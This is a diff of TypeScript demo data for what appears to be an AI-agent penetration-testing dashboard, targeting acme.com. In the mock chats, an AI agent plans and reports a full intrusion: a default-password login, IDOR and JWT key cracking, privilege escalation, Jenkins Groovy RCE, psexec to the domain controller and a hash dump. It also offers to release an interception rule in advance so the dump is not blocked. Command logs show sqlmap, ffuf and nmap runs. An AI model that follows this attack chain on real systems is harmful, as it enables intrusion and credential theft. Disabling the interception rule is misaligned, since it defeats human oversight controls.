-  decided_at: T("2026-07-26T08:00:02Z"),
+  created_at: T("2026-09-30T03:57:01Z"),
+  decided_at: T("2026-09-30T03:57:02Z"),
   conv_title: "",
   conv_agent_key: "",
   rule_name: "",
@@ -3519,7 +3547,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         text: "3 evidence indexes have been read.\nThe record contains the request time, result summary, and local file location.",
       },
     ],
-    captured_at: T("2026-07-26T08:00:00Z"),
+    captured_at: T("2026-09-30T03:57:01Z"),
     initial_action: "allow",
     initial_reason: "[Model] Write existing inspection conclusions into local reports without modifying business data.",
     effective_action: "allow",
@@ -3527,7 +3555,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     profile_id: 1,
     execution_status: "succeeded",
     output: "Successfully wrote reports/summary.md\nA total of 68 characters are written.",
-    execution_ended_at: T("2026-07-26T08:00:03Z"),
+    execution_ended_at: T("2026-09-30T03:57:03Z"),
   },
   93: {
     run_id: "demo-run-review",
@@ -3536,7 +3564,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
     user_message: "Check the purpose of the backup table, and you need to confirm it first when deleting it.",
     context: [],
-    captured_at: T("2026-07-25T15:14:00Z"),
+    captured_at: T("2026-09-29T19:57:42Z"),
     initial_action: "ask",
     initial_reason: "[Model] It is suspected to be a backup table, and it is impossible to determine whether the data is produced.",
     profile_id: 1,
@@ -3552,42 +3580,42 @@ export const conversations: Conversation[] = [
     title: "acme background entry point discussion",
     llm_profile_id: 1,
     pinned: true,
-    pinned_at: T("2026-07-26T04:00:00Z"),
-    created_at: T("2026-07-25T10:00:00Z"),
-    updated_at: T("2026-07-26T03:40:00Z"),
+    pinned_at: T("2026-09-30T02:02:40Z"),
+    created_at: T("2026-09-29T17:28:06Z"),
+    updated_at: T("2026-09-30T01:53:09Z"),
   },
   {
     id: 2,
     agent_key: "mainagent",
     title: "API override aspect sorting",
     llm_profile_id: 2,
-    created_at: T("2026-07-24T16:00:00Z"),
-    updated_at: T("2026-07-24T17:20:00Z"),
+    created_at: T("2026-09-29T08:53:31Z"),
+    updated_at: T("2026-09-29T09:31:38Z"),
   },
   {
     id: 3,
     agent_key: "mainagent",
     title: "Intranet Horizontal · DMZ→Domain Control Attack Path Planning",
     llm_profile_id: 1,
-    created_at: T("2026-07-25T15:45:00Z"),
-    updated_at: T("2026-07-26T00:25:00Z"),
+    created_at: T("2026-09-29T20:12:28Z"),
+    updated_at: T("2026-09-30T00:20:14Z"),
   },
 ];
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Where is the backend and where to start?" },
+    { seq: 1, worker: "user", ts: T("2026-09-29T17:28:06Z"), kind: "user", summary: "Where is the backend and where to start?" },
     {
       seq: 2,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:04Z"),
+      ts: T("2026-09-29T17:28:08Z"),
       kind: "thinking",
       summary: "Confirm the technology stack and protection (verification code/rate limit) of the login page of admin.acme.com before deciding to use the default password or a dictionary.",
     },
     {
       seq: 3,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:06Z"),
+      ts: T("2026-09-29T17:28:09Z"),
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c11",
@@ -3596,7 +3624,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 4,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:08Z"),
+      ts: T("2026-09-29T17:28:09Z"),
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c11",
@@ -3606,7 +3634,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 5,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:20Z"),
+      ts: T("2026-09-29T17:28:15Z"),
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c12",
@@ -3616,7 +3644,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 6,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:24Z"),
+      ts: T("2026-09-29T17:28:17Z"),
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c12",
@@ -3626,16 +3654,16 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 7,
       worker: "mainagent",
-      ts: T("2026-07-25T10:00:30Z"),
+      ts: T("2026-09-29T17:28:20Z"),
       kind: "text",
       summary:
         "Conclusion: Element-UI backend, no verification code, no rate limit. Entry sequence: ① First run the default password table (admin/admin, admin/admin123, admin/123456) ② If it fails, then go to the top1000 dictionary. I have injected \"background default password test\" into the work agent as a high-quality intent.",
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Is it done?" },
+    { seq: 8, worker: "user", ts: T("2026-09-30T01:53:09Z"), kind: "user", summary: "Is it done?" },
     {
       seq: 9,
       worker: "mainagent",
-      ts: T("2026-07-26T03:40:05Z"),
+      ts: T("2026-09-30T01:53:11Z"),
       kind: "text",
       summary:
         "It's done - admin/admin123 logs into the console directly, which has been recorded as a high-risk discovery and proves that the goal of \"obtaining background management permissions\" has been achieved. The next step turns to reading user data (goal ②).",
@@ -3645,21 +3673,21 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 1,
       worker: "user",
-      ts: T("2026-07-24T16:00:00Z"),
+      ts: T("2026-09-29T08:53:31Z"),
       kind: "user",
       summary: "Summarize the authorization findings for api.acme.com.",
     },
     {
       seq: 2,
       worker: "mainagent",
-      ts: T("2026-07-24T16:00:05Z"),
+      ts: T("2026-09-29T08:53:33Z"),
       kind: "thinking",
       summary: "First touch the API authentication method and the behavior of several key endpoints, and then judge the IDOR/JWT risks.",
     },
     {
       seq: 3,
       worker: "mainagent",
-      ts: T("2026-07-24T16:00:10Z"),
+      ts: T("2026-09-29T08:53:36Z"),
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c21",
@@ -3668,7 +3696,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 4,
       worker: "mainagent",
-      ts: T("2026-07-24T16:00:12Z"),
+      ts: T("2026-09-29T08:53:37Z"),
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c21",
@@ -3678,7 +3706,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 5,
       worker: "mainagent",
-      ts: T("2026-07-24T16:00:30Z"),
+      ts: T("2026-09-29T08:53:45Z"),
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c22",
@@ -3687,7 +3715,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 6,
       worker: "mainagent",
-      ts: T("2026-07-24T16:00:31Z"),
+      ts: T("2026-09-29T08:53:46Z"),
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c22",
@@ -3697,7 +3725,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 7,
       worker: "mainagent",
-      ts: T("2026-07-24T16:01:00Z"),
+      ts: T("2026-09-29T08:54:00Z"),
       kind: "text",
       summary:
         "There are two ways to exceed authority: ① /v1/orders?id= is a self-increasing numeric id → typical IDOR, change the id to try reading other people's orders; ② Use HS256 for JWT, try john/hashcat to explode the key → you can forge any sub to exceed authority. I derived each of these two items into an intention. It is recommended to do IDOR first (low cost, direct impact).",
@@ -3707,21 +3735,21 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 1,
       worker: "user",
-      ts: T("2026-07-25T15:45:00Z"),
+      ts: T("2026-09-29T20:12:28Z"),
       kind: "user",
       summary: "Now that I have the shell, how do I access the intranet next?",
     },
     {
       seq: 2,
       worker: "mainagent",
-      ts: T("2026-07-25T15:45:05Z"),
+      ts: T("2026-09-29T20:12:31Z"),
       kind: "thinking",
       summary: "www-data does not have enough permissions to do intranet lateralization. First, upgrade local privileges; after getting root, use DMZ as pivot to do survival discovery.",
     },
     {
       seq: 3,
       worker: "mainagent",
-      ts: T("2026-07-25T15:45:10Z"),
+      ts: T("2026-09-29T20:12:33Z"),
       kind: "text",
       summary:
         "The first step is to elevate the privileges: sudo -l has python3 password-free, directly raise root. Then use the DMZ as a springboard to perform an intranet survival scan (fscan), focusing on finding domain controllers and CI/CD servers.",
@@ -3729,14 +3757,14 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 4,
       worker: "user",
-      ts: T("2026-07-25T21:05:00Z"),
+      ts: T("2026-09-29T22:44:56Z"),
       kind: "user",
       summary: "3 stations were scanned on the intranet, and Jenkins 8080 is on. Is there any problem?",
     },
     {
       seq: 5,
       worker: "mainagent",
-      ts: T("2026-07-25T21:05:08Z"),
+      ts: T("2026-09-29T22:45:00Z"),
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c31",
@@ -3745,7 +3773,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 6,
       worker: "mainagent",
-      ts: T("2026-07-25T21:05:12Z"),
+      ts: T("2026-09-29T22:45:02Z"),
       kind: "tool_result",
       tool: "bash",
       tool_use_id: "c31",
@@ -3755,7 +3783,7 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 7,
       worker: "mainagent",
-      ts: T("2026-07-25T21:05:20Z"),
+      ts: T("2026-09-29T22:45:06Z"),
       kind: "text",
       summary:
         "There is a play - Script Console has no authentication, directly Groovy RCE. I've injected a hint to let the worker prioritize this one. After taking it, pay attention to the credential database, which may contain domain accounts.",
@@ -3763,23 +3791,23 @@ export const conversationMessages: Record<number, Activity[]> = {
     {
       seq: 8,
       worker: "user",
-      ts: T("2026-07-25T23:25:00Z"),
+      ts: T("2026-09-29T23:51:39Z"),
       kind: "user",
       summary: "I have obtained the domain account. svc_deploy is Domain Admins. Can I directly access the domain control?",
     },
     {
       seq: 9,
       worker: "mainagent",
-      ts: T("2026-07-25T23:25:10Z"),
+      ts: T("2026-09-29T23:51:43Z"),
       kind: "text",
       summary:
         "Yes. svc_deploy + Domain Admins = psexec can fetch DC01 directly. After getting it, do secretsdump to import the global hash and finish. Note that secretsdump will trigger the interception rule, I will help you release it in advance.",
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "The target is captured, let's summarize the attack chain." },
+    { seq: 10, worker: "user", ts: T("2026-09-30T00:18:48Z"), kind: "user", summary: "The target is captured, let's summarize the attack chain." },
     {
       seq: 11,
       worker: "mainagent",
-      ts: T("2026-07-26T00:22:12Z"),
+      ts: T("2026-09-30T00:18:54Z"),
       kind: "text",
       summary:
         "Complete kill chain:\n1. .git leak → source code white box + hard-coded credentials\n2. shop Fastjson RCE→DMZ rebound shell\n3. sudo privileges →root\n4. Intranet discovery→DC01/FS01/Jenkins\n5. Jenkins is not authorized → export domain credentials svc_deploy\n6. Kerberoasting→Crack svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump global hash\n\nAll four goals were achieved, with 17 discoveries (7 high/4 medium/2 low + 8 intranet links).",
@@ -3964,7 +3992,7 @@ export function assetRefsFor(_assetId: number) {
 // ── Workspace File Manager(/workspace/*,demo:Static example tree)──
 const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
   "": [
-    { name: "t-001", dir: true, size: 0 },
+    { name: "t-acme-web", dir: true, size: 0 },
     { name: "transcripts", dir: true, size: 0 },
     {
       name: "notes.md",
@@ -3973,11 +4001,11 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       content: "# Workspace Notes\n\n(demo) This is a sample file in the root directory of the workspace, which can be edited and saved online.",
     },
   ],
-  "t-001": [
+  "t-acme-web": [
     { name: "i12", dir: true, size: 0 },
     { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
   ],
-  "t-001/i12": [
+  "t-acme-web/i12": [
     {
       name: "exploit.py",
       dir: false,
@@ -4002,7 +4030,7 @@ const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");
 export function workspaceList(path: string) {
   const key = wsClean(path);
   const items = WS_TREE[key] ?? [];
-  const now = Date.parse("2026-08-09T03:00:00Z");
+  const now = Date.parse("2026-10-06T17:39:32Z");
   return {
     path: key,
     entries: items.map((it, i) => ({
@@ -4034,7 +4062,7 @@ export const commandRecords = [
     command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
     output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>…Search results page…</html>",
     is_error: false,
-    created_at: T("2026-08-09T02:10:00Z"),
+    created_at: T("2026-10-06T17:15:42Z"),
   },
   {
     id: 2,
@@ -4044,7 +4072,7 @@ export const commandRecords = [
     command: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs" }),
     output: "[*] available databases [2]:\n[*] acme_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7",
     is_error: false,
-    created_at: T("2026-08-09T02:12:30Z"),
+    created_at: T("2026-10-06T17:16:54Z"),
   },
   {
     id: 3,
@@ -4054,7 +4082,7 @@ export const commandRecords = [
     command: JSON.stringify({ command: "ffuf -u https://api.acme.com/FUZZ -w common.txt -mc 200,401,403" }),
     output: "v1       [Status: 200]\nhealth   [Status: 200]\norders   [Status: 401]\nadmin    [Status: 403]",
     is_error: false,
-    created_at: T("2026-08-09T02:15:00Z"),
+    created_at: T("2026-10-06T17:18:05Z"),
   },
   {
     id: 4,
@@ -4064,7 +4092,7 @@ export const commandRecords = [
     command: JSON.stringify({ command: "nmap -sV -p- 203.0.113.10" }),
     output: "PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9\n443/tcp open  https   nginx 1.24",
     is_error: false,
-    created_at: T("2026-08-09T02:18:00Z"),
+    created_at: T("2026-10-06T17:19:31Z"),
   },
   {
     id: 5,
@@ -4074,7 +4102,7 @@ export const commandRecords = [
     command: JSON.stringify({ command: "curl -s https://admin.acme.com/login --data 'user=admin&pass=admin123'" }),
     output: "curl: (28) Operation timed out after 10000 ms",
     is_error: true,
-    created_at: T("2026-08-09T02:20:00Z"),
+    created_at: T("2026-10-06T17:20:28Z"),
   },
 ];
 
@@ -4082,11 +4110,11 @@ export const commandRecords = [
 export const llmRecords = [
   {
     id: 1,
-    ts: T("2026-08-09T02:10:02Z"),
+    ts: T("2026-10-06T17:15:43Z"),
     model: "claude-opus-4-8",
     profile_name: "Default",
     session_id: "exp1-worker-i12",
-    task_id: "t-001",
+    task_id: "t-acme-web",
     worker: "worker-1",
     latency_ms: 3210,
     input_tokens: 8421,
@@ -4097,11 +4125,11 @@ export const llmRecords = [
   },
   {
     id: 2,
-    ts: T("2026-08-09T02:11:40Z"),
+    ts: T("2026-10-06T17:16:30Z"),
     model: "claude-opus-4-8",
     profile_name: "Default",
     session_id: "exp1-planner",
-    task_id: "t-001",
+    task_id: "t-acme-web",
     worker: "planner",
     latency_ms: 4180,
     input_tokens: 12044,
@@ -4112,11 +4140,11 @@ export const llmRecords = [
   },
   {
     id: 3,
-    ts: T("2026-08-09T02:15:20Z"),
+    ts: T("2026-10-06T17:18:15Z"),
     model: "claude-opus-4-8",
     profile_name: "Default",
     session_id: "exp1-worker-i18",
-    task_id: "t-001",
+    task_id: "t-acme-web",
     worker: "worker-2",
     latency_ms: 2890,
     input_tokens: 7311,
@@ -4127,11 +4155,11 @@ export const llmRecords = [
   },
   {
     id: 4,
-    ts: T("2026-08-09T02:16:05Z"),
+    ts: T("2026-10-06T17:18:36Z"),
     model: "claude-opus-4-8",
     profile_name: "Default",
     session_id: "exp1-worker-i18",
-    task_id: "t-001",
+    task_id: "t-acme-web",
     worker: "worker-2",
     latency_ms: 900,
     input_tokens: 7600,
